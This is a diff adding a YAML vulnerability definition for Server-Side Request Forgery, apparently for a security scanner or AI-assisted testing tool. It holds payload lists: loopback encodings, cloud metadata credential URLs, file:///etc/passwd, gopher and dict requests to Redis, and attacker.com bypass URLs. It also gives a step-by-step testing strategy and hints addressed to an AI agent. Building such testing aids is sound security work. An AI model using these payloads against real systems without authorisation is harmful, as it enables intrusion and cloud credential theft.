@@ -1,0 +1,68 @@
+id: SSRF
+name: Server-Side Request Forgery
+cwe:
+- CWE-918
+owasp: A10:2021 SSRF
+severity_range: Medium - Critical
+description: Application fetches a URL provided by the user without proper validation, allowing attackers to make requests
+  to internal services, cloud metadata, or arbitrary external targets.
+detection:
+  payloads:
+    internal_access:
+    - http://127.0.0.1
+    - http://localhost
+    - http://0.0.0.0
+    - http://[::1]
+    - http://0177.0.0.1
+    - http://2130706433
+    - http://127.1
+    - http://0x7f000001
+    - http://127.0.0.1:22
+    - http://127.0.0.1:3306
+    - http://127.0.0.1:6379
+    - http://127.0.0.1:8080
+    - http://127.0.0.1:9200
+    cloud_metadata:
+    - http://169.254.169.254/latest/meta-data/
+    - http://169.254.169.254/latest/meta-data/iam/security-credentials/
+    - http://metadata.google.internal/computeMetadata/v1/
+    - http://169.254.169.254/metadata/v1/
+    - http://100.100.100.200/latest/meta-data/
+    protocol_smuggling:
+    - file:///etc/passwd
+    - file:///c:/windows/win.ini
+    - dict://127.0.0.1:6379/info
+    - gopher://127.0.0.1:6379/_INFO%0d%0a
+    - ftp://127.0.0.1
+    dns_rebinding:
+    - http://spoofed.burpcollaborator.net
+    - http://1.attacker-controlled-dns.com
+    bypass_filters:
+    - http://127.0.0.1.nip.io
+    - http://spoofed.burpcollaborator.net
+    - http://127.0.0.1#@attacker.com
+    - http://attacker.com@127.0.0.1
+    - http://127.0.0.1%2523@attacker.com
+    - http://[0:0:0:0:0:ffff:127.0.0.1]
+    - http://127。0。0。1
+  strategy:
+  - 1. Identify parameters that accept URLs (url=, redirect=, fetch=, load=, src=, img=, href=)
+  - 2. Test with external callback server (Burp Collaborator or webhook.site)
+  - 3. Test internal IPs starting with 127.0.0.1
+  - 4. Test cloud metadata endpoints (169.254.169.254)
+  - 5. Test alternative IP representations (decimal, hex, octal)
+  - 6. Test protocol handlers (file://, gopher://, dict://)
+  - 7. Check for partial SSRF (can control hostname but not path)
+  - 8. Test for blind SSRF via timing differences or DNS callbacks
+evidence_needed: Server-side request to attacker-controlled server (DNS/HTTP callback), internal service response, or cloud
+  metadata content in response
+ai_research_hints:
+- Check webhook/integration features for SSRF
+- Test URL preview/unfurl features (Slack-style link previews)
+- Check PDF generation with URL-based images
+- Test import/export features that accept URLs
+- Look for SVG rendering with external references
+references:
+- https://portswigger.net/web-security/ssrf
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
+- https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
